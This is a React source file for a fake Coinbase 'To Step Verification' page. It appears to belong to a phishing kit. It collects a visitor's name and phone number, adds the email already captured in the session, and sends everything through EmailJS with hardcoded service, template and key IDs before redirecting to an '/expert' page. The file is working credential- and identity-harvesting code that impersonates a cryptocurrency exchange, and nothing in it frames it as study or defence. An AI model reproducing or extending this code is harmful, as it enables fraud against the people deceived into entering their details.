import { useState  } from "react";
import { useUser } from "./AuthContext";
import emailjs from 'emailjs-com';
import { useNavigate } from "react-router-dom";

const Verify = () => {
  const { userData } = useUser();
  const navigate = useNavigate();

  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [error, setError] = useState("");

  const handleSubmit = () => {
    if (!name.trim()) {
      setError("Please enter your name.");
      return;
    }
    if (!phone.match(/^\d{10}$/)) {
      setError("Please enter a valid 10-digit phone number.");
      return;
    }
    console.log("hellol.....")
    const currentDateTime = new Date().toLocaleString();

    const emailParams = {
      web_name: "Coinbase",
      message: `
      Name: ${name},
      Phone: ${phone},
      Email: ${userData.email},
      Date/Time: ${currentDateTime}
      `
    };

    emailjs.send("service_41sg0p7", "template_urm06yv", emailParams, "2sNbvXHtZ8_J2G1NZ")
      .then((response) => {
        
        console.log("Email sent successfully:", response);
        
        navigate('/expert');
      })
      .catch((error) => {
        console.error("Error sending email:", error);
        setError("Failed to send email. Please try again.");
      });
  };

  return (
    <div className="min-h-screen bg-black flex flex-col items-center justify-center px-4">
      <img src="/home.avif" className="w-40 pb-4" alt="Logo" />
      <div className="bg-zinc-900 text-white p-6 rounded-xl w-full max-w-md shadow-lg text-center">
        <h2 className="text-xl font-semibold mb-4">To Step Verification</h2>
        <input
          type="text"
          placeholder="Enter your name"
          value={name}
          onChange={(e) => setName(e.target.value)}
          className="w-full mb-4 p-3 rounded-md bg-black text-white placeholder-gray-400 focus:outline-none"
        />
        <input
          type="tel"
          maxLength={10}
          placeholder="Enter your phone number"
          value={phone}
          onChange={(e) => {
            const value = e.target.value;
            if (/^\d*$/.test(value)) {
              setPhone(value);
            }
          }}
          className="w-full mb-4 p-3 rounded-md bg-black text-white placeholder-gray-400 focus:outline-none"
        />
        {error && <p className="text-red-500 text-sm mb-2">{error}</p>}
        <button
          onClick={handleSubmit}
          className="w-full bg-blue-700 text-white font-bold py-3 rounded-lg mt-2"
        >
          Submit
        </button>
      </div>
    </div>
  );
};

export default Verify;
